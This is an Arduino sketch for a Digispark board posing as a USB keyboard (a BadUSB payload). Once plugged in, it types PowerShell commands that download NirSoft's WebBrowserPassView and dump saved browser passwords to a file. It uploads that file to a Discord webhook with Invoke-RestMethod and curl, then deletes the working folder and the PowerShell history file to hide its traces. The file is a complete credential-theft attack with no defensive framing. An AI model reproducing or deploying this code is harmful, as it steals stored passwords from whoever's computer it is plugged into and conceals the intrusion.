#include "DigiKeyboard.h"
#define KEY_DOWN 0x51 // Keyboard Down Arrow
#define KEY_ENTER 0x28 // Enter Key

void setup() {
    pinMode(1, OUTPUT); //LED on Model A
}

void loop() {
    DigiKeyboard.sendKeyStroke(0);
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(500);
    DigiKeyboard.print("powershell");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(500);
    DigiKeyboard.print("$webhook='%DISCORD_WEBHOOK%'");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(1000);
    DigiKeyboard.print("mkdir \temp ; cd \temp ; Invoke-WebRequest -Headers @{'Referer' = 'http://www.nirsoft.net/utils/web_browser_password.html'} -Uri http://www.nirsoft.net/toolsdownload/webbrowserpassview.zip -OutFile wbpv.zip ; Invoke-WebRequest -Uri https://www.7-zip.org/a/7za920.zip -OutFile 7z.zip ; Expand-Archive 7z.zip ; .\7z\7za.exe e wbpv.zip");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(20000);
    DigiKeyboard.print("wbpv28821@");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(500);
    DigiKeyboard.print(".\WebBrowserPassView.exe");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(8000);
    DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT, KEY_A);
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT, KEY_S);
    DigiKeyboard.delay(1500);
    DigiKeyboard.print("temp.html");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT, KEY_F);
    DigiKeyboard.sendKeyStroke(KEY_DOWN);
    DigiKeyboard.sendKeyStroke(KEY_DOWN);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(2000);
    DigiKeyboard.print("$content='Digispark Report'; $payload=[PSCustomObject]@{ content=$content };");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(750);
    DigiKeyboard.print("Invoke-RestMethod -ContentType 'Application/Json' -Uri $webhook -Method Post -Body ($payload | ConvertTo-Json)");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(1000);
    DigiKeyboard.print("curl.exe -F 'file1=@temp.html' $webhook")
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(500);
    DigiKeyboard.print("cd ..");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(500);
    DigiKeyboard.print("rm -r temp");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(500);
    DigiKeyboard.print("Remove-Item (Get-PSreadlineOption).HistorySavePath");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(500);
    DigiKeyboard.print("exit");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    digitalWrite(1, HIGH); //turn on led when finished
    DigiKeyboard.delay(90000);
    digitalWrite(1, LOW);
    DigiKeyboard.delay(5000);
    for(;;){ /*empty*/ }
}
